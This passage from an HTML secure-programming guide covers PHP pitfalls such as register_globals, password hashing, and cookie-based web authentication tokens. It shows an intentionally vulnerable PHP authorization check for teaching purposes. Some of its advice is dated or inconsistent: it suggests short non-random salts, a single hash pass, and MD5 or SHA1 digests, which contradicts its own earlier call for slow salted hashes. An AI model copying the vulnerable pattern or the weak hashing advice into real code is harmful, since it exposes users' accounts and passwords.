write Tcl code for secure applications.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="PHP"
>10.8. PHP</A
></H2
><P
>SecureReality has put out a very interesting paper titled
<SPAN
CLASS="QUOTE"
>&#8220;A Study In Scarlet - Exploiting Common Vulnerabilities in PHP&#8221;</SPAN
>
[Clowes 2001],
which discusses some of the problems in writing secure programs in PHP,
particularly in versions before PHP 4.1.0.
Clowes concludes that
<SPAN
CLASS="QUOTE"
>&#8220;it is very hard to write a secure PHP application (in the
default configuration of PHP), even if you try&#8221;</SPAN
>.</P
><P
>Granted, there are security issues in any language, but one
particular issue stands out in older versions of PHP that arguably makes
older PHP versions
less secure than most languages: the way it loads data into its namespace.
By default, in PHP (versions 4.1.0 and lower)
all environment variables and values sent to PHP over the web
are automatically loaded into the same namespace (global variables)
that normal variables are loaded into - so attackers can set arbitrary
variables to arbitrary values, which keep their values unless explicitly
reset by a PHP program.
In addition, PHP automatically creates variables with a
default value when they&#8217;re first requested, so
it&#8217;s common for PHP programs to not initialize variables.
If you forget to set a variable, PHP can report it, but
by default PHP won&#8217;t - and note that this simply an error report, it
won&#8217;t stop an attacker who finds an unusual way to cause it.
Thus, by default PHP allows an attacker to
completely control the values of all variables in a program unless
the program takes special care to override the attacker.
Once the program takes over, it can reset these variables,
but failing to reset
any variable (even one not obvious) might open a vulnerability in the
PHP program.</P
><P
>For example, the following PHP program (an example from Clowes)
intends to only let those who
know the password to get some important information, but an attacker
can set <SPAN
CLASS="QUOTE"
>&#8220;auth&#8221;</SPAN
> in their web browser and subvert the authorization check:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> &#60;?php
  if ($pass == "hello")
   $auth = 1;
  ...
  if ($auth == 1)
   echo "some important information";
 ?&#62;</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>I and many others have complained about this particularly
dangerous problem; it&#8217;s particularly a problem because
PHP is widely used.
A language that&#8217;s supposed to be easy to use better make
it easy to write secure programs in, after all.
It&#8217;s possible to disable this misfeature in PHP by turning the setting
<SPAN
CLASS="QUOTE"
>&#8220;register_globals&#8221;</SPAN
> to <SPAN
CLASS="QUOTE"
>&#8220;off&#8221;</SPAN
>, but by default PHP versions up through 4.1.0
default set this to <SPAN
CLASS="QUOTE"
>&#8220;on&#8221;</SPAN
> and PHP before 4.1.0 is harder
to use with register_globals off.
The PHP developers warned in their PHP 4.1.0 announcenment that
<SPAN
CLASS="QUOTE"
>&#8220;as of the next semi-major version of PHP, new installations of PHP will
default to having register_globals set to off.&#8221;</SPAN
>
This has now happened; as of PHP version 4.2.0, External 
variables (from the environment, the HTTP request, cookies or the web 
server) are no longer registered in the global scope by default. The 
preferred method of accessing these external variables is by using the new 
Superglobal arrays, introduced in PHP 4.1.0.</P
><P
>PHP with <SPAN
CLASS="QUOTE"
>&#8220;register_globals&#8221;</SPAN
> set to <SPAN
CLASS="QUOTE"
>&#8220;on&#8221;</SPAN
> is a dangerous choice
for nontrivial programs - it&#8217;s just too easy to write insecure programs.
However, once <SPAN
CLASS="QUOTE"
>&#8220;register_globals&#8221;</SPAN
> is set to <SPAN
CLASS="QUOTE"
>&#8220;off&#8221;</SPAN
>, PHP is quite
a reasonable language for development.</P
><P
>The secure default should include setting
<SPAN
CLASS="QUOTE"
>&#8220;register_globals&#8221;</SPAN
> to <SPAN
CLASS="QUOTE"
>&#8220;off&#8221;</SPAN
>, and also including several functions to
make it much easier for users to specify and limit the input they&#8217;ll
accept from external sources.
Then web servers (such as Apache) could separately configure this
secure PHP installation.
Routines could be placed in the PHP library to make it
easy for users to list the input variables they want to accept;
some functions could check the patterns these variables must have
and/or the type that the variable must be coerced to.
In my opinion, PHP is a bad choice for secure web development
if you set register_globals on.</P
><P
>As I suggested in earlier versions of this book,
PHP has been modified to become a reasonable choice
for secure web development.
However, note that PHP doesn&#8217;t have a particularly good
security vulnerability track record
(e.g., register_globals, a file upload problem, and a format
string problem in the error reporting library);
I believe that security issues were not considered sufficiently in
early editions of PHP;
I also think that the PHP developers are now emphasizing security
and that these security issues are finally getting worked out.
One evidence is the major change that the PHP developers have made to
get turn off register_globals; this had a significant impact on
PHP users, and their willingness to make this change is a good sign.
Unfortunately, it&#8217;s not yet clear how secure PHP really is;
PHP just hasn&#8217;t had much of a track record now that the developers
of PHP are examining it seriously for security issues.
Hopefully this will become clear quickly.</P
><P
>If you&#8217;ve decided to use PHP, here are some of my recommendations
(many of these recommendations are based on ways to counter
the issues that Clowes raises):
<P
></P
><UL
><LI
><P
>Set the PHP configuration option
<SPAN
CLASS="QUOTE"
>&#8220;register_globals&#8221;</SPAN
> off, and use PHP 4.2.0 or greater.
PHP 4.1.0 adds several special arrays, particularly $_REQUEST,
which makes it far simpler to develop software in PHP
when <SPAN
CLASS="QUOTE"
>&#8220;register_globals&#8221;</SPAN
> is off.
Setting register_globals off, which is the default in PHP 4.2.0,
completely eliminates the most common PHP attacks.
If you&#8217;re assuming that register_globals is off, you should check for
this first (and halt if it&#8217;s not true) - that way, people who install
your program will quickly know there&#8217;s a problem.
Note that many third-party PHP applications cannot
work with this setting, so it can be difficult to
keep it off for an entire website.
It&#8217;s possible to set register_globals off for only some programs.
For example, for Apache, you could insert these lines into the file .htaccess
in the PHP directory (or use Directory directives to control it further):
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> php_flag register_globals Off
 php_flag track_vars On</PRE
></FONT
></TD
></TR
></TABLE
>
However, the .htaccess file itself is ignored unless the Apache web server
is configured to permit overrides; often the Apache global configuration
is set so that AllowOverride is set to None.
So, for Apache users,
if you can convince your web hosting service to set <SPAN
CLASS="QUOTE"
>&#8220;AllowOverride Options&#8221;</SPAN
>
in their configuration file (often /etc/http/conf/http.conf) for your
host, do that.
Then write helper functions to simplify loading the data you need
(and only that data).</P
></LI
><LI
><P
>If you must develop software where register_globals might be on while
running (e.g., a widely-deployed PHP application),
always set values not provided by the user.
Don&#8217;t depend on PHP
default values, and don&#8217;t trust any variable you haven&#8217;t explicitly set.
Note that you have to do this for <EM
>every</EM
> entry point
(e.g., every PHP program or HTML file using PHP).
The best approach is to begin each PHP program by setting all variables
you&#8217;ll be using, even if you&#8217;re simply resetting them to the
usual default values (like "" or 0).
This includes global variables referenced in included files,
even all libraries, transitively.
Unfortunately, this makes this recommendation hard to do, because few
developers truly know and understand all global variables that may be used
by all functions they call.
One lesser alternative is to search through HTTP_GET_VARS, HTTP_POST_VARS,
HTTP_COOKIE_VARS, and HTTP_POST_FILES to see if the user provided the data -
but programmers often forget to check all sources, and what happens if
PHP adds a new data source
(e.g., HTTP_POST_FILES wasn&#8217;t in old versions of PHP).
Of course, this simply tells you how to make the best of a bad
situation; in case you haven&#8217;t noticed yet, turn off
register_globals!</P
></LI
><LI
><P
>Set the error reporting level to E_ALL, and resolve all errors reported
by it during testing.
Among other things, this will complain about un-initialized variables,
which are a key issues in PHP.
This is a good idea anyway whenever you start using PHP, because
this helps debug programs, too.
There are many ways to set the error reporting level, including in the
<SPAN
CLASS="QUOTE"
>&#8220;php.ini&#8221;</SPAN
> file (global), the <SPAN
CLASS="QUOTE"
>&#8220;.htttpd.conf&#8221;</SPAN
> file (single-host),
the <SPAN
CLASS="QUOTE"
>&#8220;.htaccess&#8221;</SPAN
> file (multi-host), or at the top of the script
through the error_reporting function.
I recommend setting the error reporting level in both the php.ini file
and also at the top of the script; that way, you&#8217;re protected if
(1) you forget to insert the command at the top of the script, or (2) move the
program to another machine and forget to change the php.ini file.
Thus, every PHP program should begin like this:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  &#60;?php error_reporting(E_ALL);?&#62;</PRE
></FONT
></TD
></TR
></TABLE
>
It could be argued that this error reporting should be turned on
during development, but turned off when actually run on a real site
(since such error message could give useful information to an attacker).
The problem is that if they&#8217;re disabled during <SPAN
CLASS="QUOTE"
>&#8220;actual use&#8221;</SPAN
> it&#8217;s all
too easy to leave them disabled during development.
So for the moment, I suggest the simple approach of simply including it
in every entrance.
A much better approach is to record all errors, but direct the error reports
so they&#8217;re only included in a log file
(instead of having them reported to the attacker).</P
></LI
><LI
><P
>Filter any user information used to create filenames carefully, in
particular to prevent remote file access.
PHP by default comes with <SPAN
CLASS="QUOTE"
>&#8220;remote files&#8221;</SPAN
> functionality -- that means
that file-opening commands like fopen(), that in other languages can
only open local files, can actually be used to invoke web or ftp
requests from another site.</P
></LI
><LI
><P
>Do not use old-style PHP file uploads; use the HTTP_POST_FILES array
and related functions.
PHP supports file uploads by uploading the file to some
temporary directory with a special filename.
PHP originally set a collection of variables to indicate where that filename
was, but since an attacker can control variable names and their values,
attackers could use that ability to cause great mischief.
Instead, always use HTTP_POST_FILES and related functions to access
uploaded files.
Note that even in this case, PHP&#8217;s approach permits attackers to
temporarily upload files to you with arbitrary content, which is
risky by itself.</P
></LI
><LI
><P
>Only place protected entry points in the document tree; place all
other code (which should be most of it) outside the document tree.
PHP has a history of unfortunate advice on this topic.
Originally, PHP users were supposed to use the <SPAN
CLASS="QUOTE"
>&#8220;.inc&#8221;</SPAN
> (include)
extension for <SPAN
CLASS="QUOTE"
>&#8220;included&#8221;</SPAN
> files, but these included files often had
passwords and other information, and Apache would just give requesters
the contents of the <SPAN
CLASS="QUOTE"
>&#8220;.inc&#8221;</SPAN
> files when asked to do so when they
were in the document tree.
Then developers gave all files a <SPAN
CLASS="QUOTE"
>&#8220;.php&#8221;</SPAN
> extension - which meant that the
contents weren&#8217;t seen, but now files never meant to be entry points
became entry points and were sometimes exploitable.
As mentioned earlier, the usual security advice is the best:
place only the proected entry points (files) in the document tree, and
place other code (e.g., libraries) outside the document tree.
There shouldn&#8217;t be any <SPAN
CLASS="QUOTE"
>&#8220;.inc&#8221;</SPAN
> files in the document tree at all.</P
></LI
><LI
><P
>Avoid the session mechanism.
The <SPAN
CLASS="QUOTE"
>&#8220;session&#8221;</SPAN
> mechanism is handy for storing persistent data, but
its current implementation has many problems.
First, by default sessions store information in temporary files - so
if you&#8217;re on a multi-hosted system, you open yourself up to many attacks and
revelations.
Even those who aren&#8217;t currently multi-hosted may find themselves
multi-hosted later!
You can "tie" this information into a database instead of the filesystem,
but if others on a multi-hosted database can access that database with the
same permissions, the problem is the same.
There are also ambiguities if you&#8217;re not careful
(<SPAN
CLASS="QUOTE"
>&#8220;is this the session value or an attacker&#8217;s value&#8221;</SPAN
>?)
and this is another case where an attacker can force a file or
key to reside
on the server with content of their choosing - a dangerous situation -
and the attacker can even control to some extent the name of the file or key
where this data will be placed.</P
></LI
><LI
><P
>Use directives to limit privileges
(such as safe_mode, disable_function, and open_basedir), but do not rely
on them.
These directives can help limit some simple casual
attacks, so they&#8217;re worth applying.
However, they&#8217;re unlikely to be sufficient to protect against real attacks;
they depend only on the user-space PHP program to do protection, a function
it&#8217;s not really designed to perform.
Instead, you should employ operating system protections (e.g., running
separate processes and users) for serious protection.</P
></LI
><LI
><P
>For all inputs, check that they match a pattern for acceptability
(as with any language), and then use type casting to coerce non-string data
into the type it should have.
Develop <SPAN
CLASS="QUOTE"
>&#8220;helper&#8221;</SPAN
> functions to easily check and import a selected list
of (expected) inputs.
PHP is loosely typed, and this can cause trouble.
For example, if an input datum has the value "000", it won&#8217;t be equal to "0"
nor is it empty().
This is particularly important for associative arrays, because their
indexes are strings; this means that $data["000"]
is different than $data["0"].
For example, to make sure $bar has type double (after making sure it
only has the format legal for a double):
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  $bar = (double) $bar; </PRE
></FONT
></TD
></TR
></TABLE
></P
></LI
><LI
><P
>Be careful of any functions that
execute PHP code as strings - make sure attackers cannot control
the string contents.
This includes
eval(),
exec(),
include(),
passthru(),
popen(),
preg_replace() when the /e modifier is used,
require(),
system(),
and the backtick operator.</P
></LI
><LI
><P
>Be especially careful of risky functions.
For example, this includes functions that open files
(e.g., fopen(), readfile(), and file()); make sure attackers cannot
force the program to open arbitrary files.
Older versions of PHP (prior to 4.3.0) had a buffer overflow vulnerability
in the wordwrap() function, so if you use old versions beware
(or even better, upgrade, and make sure your customers upgrade by
checking the version number in the installer).</P
></LI
><LI
><P
>Use magic_quotes_gpc() where appropriate - this eliminates many kinds of
attacks.</P
></LI
><LI
><P
>Avoid file uploads, and consider modifying the php.ini file to
disable them (file_uploads = Off).
File uploads have had security holes in the past, so on older PHP&#8217;s this
is a necessity, and until more experience shows that they&#8217;re safe this
isn&#8217;t a bad thing to remove.
Remember, in general, to secure a system you should disable or remove
anything you don&#8217;t need.</P
></LI
></UL
></P
></DIV
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="SPECIAL"
></A
>Chapter 11. Special Topics</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>Understanding is a fountain of life to those who have it,
but folly brings punishment to fools.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Proverbs 16:22 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="PASSWORDS"
>11.1. Passwords</A
></H2
><P
>Where possible, don&#8217;t write code to handle passwords.
In particular, if the application is local,
try to depend on the normal login authentication by a user.
If the application is a CGI script, try to depend on the web server to provide
the protection as much as possible -
but see below about handling authentication in a web server.
If the application is over a network, avoid sending the password as cleartext
(where possible) since it can
be easily captured by network sniffers and reused later.
<SPAN
CLASS="QUOTE"
>&#8220;Encrypting&#8221;</SPAN
> a password using some key fixed in the algorithm or using
some sort of shrouding algorithm is essentially the same as sending the
password as cleartext.</P
><P
>When transmitting passwords over a network,
cryptographically authenticate and encrypt the connection.
(Below we will discuss web authentication, which typically uses
SSL/TLS to do this.)</P
><P
>When implementing a system that users log in to using passwords
(such as many server),
<EM
>never</EM
> store the passwords as-is
(i.e., never store passwords <SPAN
CLASS="QUOTE"
>&#8220;in the clear&#8221;</SPAN
>).
A common problem today is that attackers may be able to briefly
break into systems, or acquire data backups;
in such cases they can then forge every user account, at least on that
system and typically on many others.</P
><P
>Today, the bare-minimum acceptable method for systems that many users
log into using passwords to use
<EM
>a cryptographic hash that includes per-user salt and
uses an intentionally-slow hash function designed for the purpose</EM
>.
For brevity, these are known as
<SPAN
CLASS="QUOTE"
>&#8220;salted hashes&#8221;</SPAN
>
(though many would use the term <SPAN
CLASS="QUOTE"
>&#8220;salted hash&#8221;</SPAN
> if it only
met the first two criteria).
Let's briefly examine what that means, and why each part is necessary:</P
><P
></P
><UL
><LI
><P
>Cryptographic hash:
A cryptographic hash function, such as SHA-512, converts data into a
<SPAN
CLASS="QUOTE"
>&#8220;fingerprint&#8221;</SPAN
> that is very difficult to invert.
If a hash function is used, an attacker cannot just see what the
password is, but instead, must somehow determine the password given
the fingerprint.</P
></LI
><LI
><P
>Per-user salt:
An attacker could counteract simple cryptographic hashes by simply
pre-hashing many common passwords and then seeing if any of the many
passwords match one the precomputed hash values.
This can be counteracted by creating, for each user, an additional
random value called a <EM
>salt</EM
> that
is used as part of the data to be hashed.
This data needs to be stored (unencrypted) for each user.
Salt should be generated using a cryptographic pseudo-random number generator,
and a it should have at least 128 bits (per NIST SP 800-132).</P
></LI
><LI
><P
>Key derivation / iterated functions:
The stored value should be created using a key derivation
or key stretching function; such functions are intentionally slightly slow
by iterating some operation many times.
This slowness is designed to be irrelevant in normal operation, but the
additional cycles greatly impede attackers who are trying to do
password-guessing on a specific higher-value user account.
A key derivation function repeatedly uses a cryptographic hash,
a cipher, or HMAC methods.
A really common key derivation function is
PBKDF2 (Password-Based Key Derivation Function 2);
this is RSA Laboratories' Public-Key Cryptography Standards (PKCS) #5 v2.0,
RFC 2898,
and
in "Recommendation for Password-Based Key Derivation" NIST Special Publication 800-132.
However, PBKDF2 can be implemented rather quickly in GPUs and specialized
hardware, and GPUs in particular are widely available.
Today you should prefer iteration algorithms like bcrypt, which is
designed to better counter attackers using GPUs and specialized hardware.</P
></LI
></UL
><P
>If your application permits users to set their passwords, check
the passwords and permit only <SPAN
CLASS="QUOTE"
>&#8220;good&#8221;</SPAN
> passwords
(e.g., not in a dictionary, having certain minimal length, etc.).
You may want to look at information such as
<A
HREF="http://consult.cern.ch/writeup/security/security_3.html"
TARGET="_top"
>http://consult.cern.ch/writeup/security/security_3.html</A
>
on how to choose a good password.
You should use PAM if you can, because it supports pluggable password checkers.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="WEB-AUTHENTICATION"
>11.2. Authenticating on the Web</A
></H2
><P
>On the web, a web server is usually authenticated to users by using SSL or TLS
and a server certificate - but it&#8217;s not as easy to authenticate who
the users are.
SSL and TLS do support client-side certificates, but there are many practical
problems with actually using them (e.g., web browsers don&#8217;t support a single
user certificate format and users find it difficult to install them).
You can learn about how to set up digital certificates from many places, e.g.,
<A
HREF="http://www.petbrain.com/modules.php?op=modload&#38;name=pki&#38;file=index"
TARGET="_top"
>Petbrain</A
>.
Using Java or Javascript has its own problems, since many users disable them,
some firewalls filter them out, and they tend to be slow.
In most cases, requiring every user to install a plug-in is impractical too,
though if the system is only for an intranet for a relatively
small number of users this may be appropriate.</P
><P
>If you&#8217;re building an intranet application, you should generally use
whatever authentication system is used by your users.
Unix-like systems tend to use Kerberos, NIS+, or LDAP.
You may also need to deal with a Windows-based authentication schemes
(which can be viewed as proprietary variants of Kerberos and LDAP).
Thus, if your organization depend on Kerberos,
design your system to use Kerberos.
Try to separate the authentication system from the rest of your application,
since the organization may (will!) change their authentication system over
time.
The article
<A
HREF="http://www-106.ibm.com/developerworks/java/library/wa-singlesign/?ca=dgr-lnxw02CASsso"
TARGET="_top"
>Build and implement a single sign-on solution</A
>
discusses some approaches for implementing single sign-on (SSO) for
intranets.</P
><P
>Many techniques for authentication
don&#8217;t work or don&#8217;t work very well for Internet applications.
One approach that works in some cases
is to use <SPAN
CLASS="QUOTE"
>&#8220;basic authentication&#8221;</SPAN
>, which is built into
essentially all browsers and servers.
Unfortunately, basic authentication sends passwords unencrypted, so it
makes passwords easy to steal; basic authentication by itself is really
useful only for worthless information.
You could store authentication information in the URLs selected by the users,
but for most circumstances you should never do this - not only are
the URLs sent unprotected over the wire (as with basic authentication),
but there are too many other ways that
this information can leak to others
(e.g., through the browser history logs stored by many browsers,
logs of proxies, and to other web sites through the Referer: field).
You could wrap all communication with a web server using
an SSL/TLS connection (which would encrypt it); this is secure
(depending on how you do it), and it&#8217;s
necessary if you have important data, but note that
this is costly in terms of performance.
You could also use <SPAN
CLASS="QUOTE"
>&#8220;digest authentication&#8221;</SPAN
>, which exposes the communication
but at least authenticates the user without exposing the
underlying password used to authenticate the user.
Digest authentication is intended to be a simple partial solution for
low-value communications,
but digest authentication
is not widely supported in an interoperable way by web browsers and servers.
In fact, as noted in a March 18, 2002 eWeek article,
Microsoft&#8217;s web client (Internet Explorer) and web server (IIS)
incorrectly implement the standard  (RFC 2617), and thus won&#8217;t work with
other servers or browsers. Since Microsoft
don&#8217;t view this incorrect implementation as a serious
problem, it will be a very long time before most of their customers have
a correctly-working program.</P
><P
>Thus, the most common technique for storing authentication
information on the web today is through cookies.
Cookies weren&#8217;t really designed for this purpose, but they can be used
to support authentication - but there are many wrong ways to use them that
create security vulnerabilities, so be careful.
For more information about cookies, see IETF RFC 2965, along with the
older specifications about them.
Note that to use cookies, some browsers (e.g., Microsoft
Internet Explorer 6) may insist that you
have a privacy profile (named p3p.xml on the root directory of the server).</P
><P
>Note that some users don&#8217;t accept cookies, so this solution still has
some problems.
If you want to support these users,
you should send this authentication information back and forth via
HTML form hidden fields
(since nearly all browsers support them without concern).
You&#8217;d use the same approach as with cookies - you&#8217;d just use a different
technology to have the data sent from the user to the server.
Naturally, if you implement this approach, you need to include settings to
ensure that these pages aren&#8217;t cached for use by others.
However, while I think avoiding cookies
is preferable, in practice these other approaches often require
much more development effort.
Since it&#8217;s so hard to implement this on a large scale for many
application developers, I&#8217;m not currently stressing these approaches.
I would rather describe an approach that is reasonably secure and
reasonably easy to implement, than emphasize approaches that are too
hard to implement correctly (by either developers or users).
However, if you can do so without much effort, by all means support
sending the authentication information using form hidden fields and
an encrypted link (e.g., SSL/TLS).
As with all cookies, for these cookies you
should turn on the HttpOnly flag unless
you have a web browser script that must be able to read the cookie.</P
><P
>Fu [2001] discusses client authentication on the web, along with a
suggested approach, and this is the approach I suggest for most sites.
The basic idea is that client authentication is split into two parts,
a <SPAN
CLASS="QUOTE"
>&#8220;login procedure&#8221;</SPAN
> and <SPAN
CLASS="QUOTE"
>&#8220;subsequent requests.&#8221;</SPAN
>
In the login procedure, the server asks for the user&#8217;s username and password,
the user provides them, and the server replies with an
<SPAN
CLASS="QUOTE"
>&#8220;authentication token&#8221;</SPAN
>.
In the subsequent requests, the client (web browser)
sends the authentication token
to the server (along with its request); the server verifies that the 
token is valid, and if it is, services the request.
Another good source of information about web authentication is
Seifried [2001].</P
><P
>One serious problem with some web authentication techniques is that
they are vulnerable to a problem called "session fixation".
In a session fixation attack, the attacker fixes the user&#8217;s session ID
before the user even logs into the target server, thus eliminating the
need to obtain the user&#8217;s session ID afterwards.
Basically, the attacker obtains an account, and then tricks another
user into using the attacker&#8217;s account - often by creating a special
hypertext link and tricking the user into clicking on it.
A good paper describing session fixation is the paper by
<A
HREF="http://www.acros.si/papers/session_fixation.pdf"
TARGET="_top"
>Mitja Kolsek [2002]</A
>.
A web authentication system you use should be resistant to session fixation.</P
><P
>A good general checklist that covers website authentication is
<A
HREF="http://www.securityfocus.com/infocus/1688"
TARGET="_top"
>Mark Burnett&#8217;s articles on SecurityFocus</A
>.</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="WEB-AUTHENTICATION-LOGIN"
>11.2.1. Authenticating on the Web: Logging In</A
></H3
><P
>The login procedure is typically implemented as an HTML form;
I suggest using the field names <SPAN
CLASS="QUOTE"
>&#8220;username&#8221;</SPAN
> and <SPAN
CLASS="QUOTE"
>&#8220;password&#8221;</SPAN
> so that
web browsers can automatically perform some useful actions.
Make sure that the password is sent over an encrypted connection
(using SSL or TLS, through an https: connection) - otherwise, eavesdroppers
could collect the password.
Make sure all password text fields are marked as passwords in the HTML,
so that the password text is not visible to
anyone who can see the user&#8217;s screen.</P
><P
>If both the username and password fields are filled in,
do not try to automatically log in as that user.
Instead, display the login form with the user and password fields;
this lets the user verify that they really want to log in as that user.
If you fail to do this, attackers will be able to exploit this weakness to
perform a session fixation attack.
Paranoid systems might want simply ignore the password field and make the
user fill it in, but this interferes with browsers which can store
passwords for users.</P
><P
>When the user sends username and password, it must be checked against
the user account database.
This database shouldn&#8217;t store the passwords <SPAN
CLASS="QUOTE"
>&#8220;in the clear&#8221;</SPAN
>, since if
someone got a copy of the this database they&#8217;d suddenly get everyone&#8217;s
password (and users often reuse passwords).
Some use crypt() to handle this, but crypt can only handle a small
input, so I recommend using a different approach (this is my approach -
Fu [2001] doesn&#8217;t discuss this).
Instead, the user database should store a username, salt, and 
the password hash for that user.
The <SPAN
CLASS="QUOTE"
>&#8220;salt&#8221;</SPAN
> is just a random sequence of characters, used to make it
harder for attackers to determine a password even if they get the
password database - I suggest an 8-character random sequence.
It doesn&#8217;t need to be cryptographically random, just different from
other users.
The password hash should be computed by concatenating
<SPAN
CLASS="QUOTE"
>&#8220;server key1&#8221;</SPAN
>, the user&#8217;s password, and the salt, and
then running a cryptographically secure hash algorithm.
Server key1 is a secret key unique to this server - keep it separate
from the password database.
Someone who has server key1 could then run programs to crack user
passwords if they also had the password database;
since it doesn&#8217;t need to be memorized, it can be a long and complex
password.</P
><P
>Thus, when users create their accounts, the password is hashed and
placed in the password database.
When users try to log in, the purported password is hashed and compared
against the hash in the database (they must be equal).
When users change their password, they should type in both the old
and new password, and the new password twice (to make sure they didn&#8217;t
mistype it); and again, make sure none of these password&#8217;s characters
are visible on the screen.</P
><P
>By default, don&#8217;t save the passwords themselves on the client&#8217;s
web browser using cookies - users may sometimes use shared clients
(say at some coffee shop).
If you want, you can give users the option of <SPAN
CLASS="QUOTE"
>&#8220;saving the password&#8221;</SPAN
>
on their browser, but if you do, make sure that the password is set to
only be transmitted on <SPAN
CLASS="QUOTE"
>&#8220;secure&#8221;</SPAN
> connections, and make sure the user has
to specifically request it (don&#8217;t do this by default).</P
><P
>Make sure that the page is marked to not be cached, or a proxy
server might re-serve that page to other users.</P
><P
>Once a user successfully logs in, the server needs to send the client
an <SPAN
CLASS="QUOTE"
>&#8220;authentication token&#8221;</SPAN
> in a cookie, which is described next.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="WEB-AUTHENTICATION-SUBSEQUENT"
>11.2.2. Authenticating on the Web: Subsequent Actions</A
></H3
><P
>Once a user logs in, the server sends back to the client a cookie
with an authentication token that will be used from then on.
A separate authentication token is used, so that users don&#8217;t need to keep
logging in, so that passwords aren&#8217;t continually sent back and forth, and
so that unencrypted communication can be used if desired.
A suggested token (ignoring session fixation attacks) would look like this:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  exp=t&#38;data=s&#38;digest=m</PRE
></FONT
></TD
></TR
></TABLE
>
Where t is the expiration time of the token (say, in several hours),
and data s identifies the user (say, the user name or session id).
The digest is a keyed digest of the other fields.
Feel free to change the field name of <SPAN
CLASS="QUOTE"
>&#8220;data&#8221;</SPAN
> to be more descriptive
(e.g., username and/or sessionid).
If you have more than one field of data (e.g., both a username and a
sessionid), make sure the digest uses both the field names and data values
of all fields you&#8217;re authenticating; concatenate them with a pattern
(say <SPAN
CLASS="QUOTE"
>&#8220;%%&#8221;</SPAN
>, <SPAN
CLASS="QUOTE"
>&#8220;+&#8221;</SPAN
>, or <SPAN
CLASS="QUOTE"
>&#8220;&#38;&#8221;</SPAN
>)
that can&#8217;t occur in any of the field data values.
As described in a moment, it would be a good idea to include a username.
The keyed digest should be a cryptographic hash of the other information in
the token, keyed using a different server key2.
The keyed digest should use HMAC-MD5 or HMAC-SHA1, using a different server
key (key2), though simply using SHA1 might be okay for some purposes
(or even MD5, if the risks are low).
Key2 is subject to brute force guessing attacks, so it should be
long (say 12+ characters) and unguessable; it does NOT need to be easily
remembered.
If this key2 is compromised, anyone can authenticate to the server, but
it&#8217;s easy to change key2 - when you do, it&#8217;ll simply force currently
<SPAN
CLASS="QUOTE"
>&#8220;logged in&#8221;</SPAN
> users to re-authenticate.
See Fu [2001] for more details.</P
><P
>There is a potential weakness in this approach.
I have concerns that Fu&#8217;s approach, as originally described, is weak against
session fixation attacks (from several different directions, which
I don&#8217;t want to get into here).
Thus, I now suggest modifying Fu&#8217;s approach and using this token format
instead:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  exp=t&#38;data=s&#38;client=c&#38;digest=m</PRE
></FONT
></TD
></TR
></TABLE
>
This is the same as the original Fu aproach, and older versions of
this book (before December 2002) didn&#8217;t suggest it.
This modification adds a new
"client" field to uniquely identify the client&#8217;s current location/identity.
The data in the client field should be something that should change
if someone else tries to use the account; ideally, its new value should be
unguessable, though that&#8217;s hard to accomplish in practice.
Ideally the client field would be the client&#8217;s SSL client certificate,
but currently that&#8217;s a suggest that is hard to meet.
At the least, it should be the user&#8217;s IP address (as perceived from
the server, and remember to plan for IPv6&#8217;s longer addresses).
This modification doesn&#8217;t completely counter session fixation attacks,
unfortunately (since if an attacker can determine what the user
would send, the attacker may be able to make a request to a server
and convince the client to accept those values).
However, it does add resistance to the attack.
Again, the digest must now include all the other data.</P
><P
>Here&#8217;s an example.
If a user logs into foobar.com sucessfully, you might establish
the expiration date as 2002-12-30T1800 (let&#8217;s assume we&#8217;ll transmit as
ASCII text in this format for the moment), the username as "fred",
the client session as "1234", and you might determine that the
client&#8217;s IP address was 5.6.7.8.
If you use a simple SHA-1 keyed digest
(and use a key prefixing the rest of the data), with the server key2 value of
"rM!V^m~v*Dzx", the digest could be computed over:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> exp=2002-12-30T1800&#38;user=fred&#38;session=1234&#38;client=5.6.7.8</PRE
></FONT
></TD
></TR
></TABLE
>
A keyed digest can be computed by running a cryptographic hash code
over, say, the server key2, then the data;
in this case, the digest would be:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>101cebfcc6ff86bc483e0538f616e9f5e9894d94</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>From then on, the server must check the expiration time and recompute the
digest of this authentication token, and only accept client requests
if the digest is correct.
If there&#8217;s no token, the server should reply with the user login page
(with a hidden form field to show where the successful login should go
